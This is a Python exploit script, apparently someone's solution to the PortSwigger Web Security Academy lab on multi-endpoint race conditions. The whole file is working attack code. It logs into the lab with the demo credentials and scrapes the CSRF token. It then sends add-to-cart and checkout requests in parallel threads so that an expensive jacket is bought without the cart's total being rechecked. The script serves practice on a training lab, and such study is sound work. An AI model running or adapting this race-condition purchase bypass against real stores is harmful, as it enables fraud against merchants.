"""
Exploit for lab:
    Multi-endpoint race conditions
    https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint

By Xqweak.
"""
import requests
from bs4 import BeautifulSoup
import argparse
from pprint import pprint
import threading
import warnings
from time import sleep
warnings.filterwarnings("ignore")
def add_l33t_jacket(url,session_cookie):
    cart_url = f'{url}/cart'
    l33t_jacket_data = {
            "productId":1,
            "redir":"PRODUCT",
            "quantity":1
            }
    cookie = {"session":session_cookie}
    ans = requests.post(cart_url, l33t_jacket_data, cookies=cookie, verify=False)
    print(ans)

def purchase_items(url, csrf_token, session_cookie):
    purchase_url = f'{url}/cart/checkout'
    cookie = {"session":session_cookie}
    data = {"csrf":csrf_token}
    requests.post(purchase_url, data, cookies=cookie, verify=False)


class RaceConditioner:
    def __init__(self, url):
        self.url = url

    def grab_cookies(self):
        # Login and create the session
        s = requests.Session()
        s.verify = False
        login_url = f"{self.url}/login"
        print(f'logging in {self.url}')
        c = s.get(login_url)
        soup = BeautifulSoup(c.content, 'lxml')
        token = soup.find('input',{"name":"csrf"})["value"]
        acc_details = {
                "username":"wiener",
                "password":"peter",
                "csrf":token
                }
        pprint(acc_details)
        s.post(login_url , acc_details)
        print(f"logued under session cookie {s.cookies['session']}")
        return s , s.cookies["session"]

    def exploit_multi_endpoint_race_condition(self):
        """Exploit multi endpoint race condition"""
        s, s_cookie = self.grab_cookies()
        cart_url = f'{self.url}/cart'
        c = s.get(cart_url).content
        coupon = {
            "productId":2,
            "redir":"CART",
            "quantity":1
            }
        ans = s.post(cart_url, coupon)
        csrf_token = BeautifulSoup(ans.content,'lxml').find('input',{"name":"csrf"})["value"]
        print('Racing...')
        t1 = threading.Thread(target = add_l33t_jacket, args=(self.url, s_cookie))
        t2 = threading.Thread(target = purchase_items, args=(self.url, csrf_token, s_cookie  ) )
        # Start racing
        sleep(1)
        t1.start()
        t2.start()
        t1.join()
        t2.join()


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u' ,'--url', required=True, help="Lab of portswigger academy url", type=str )
    args = parser.parse_args()
    lab = RaceConditioner(args.url)
    print('buying l33t jacket!')
    lab.exploit_multi_endpoint_race_condition()
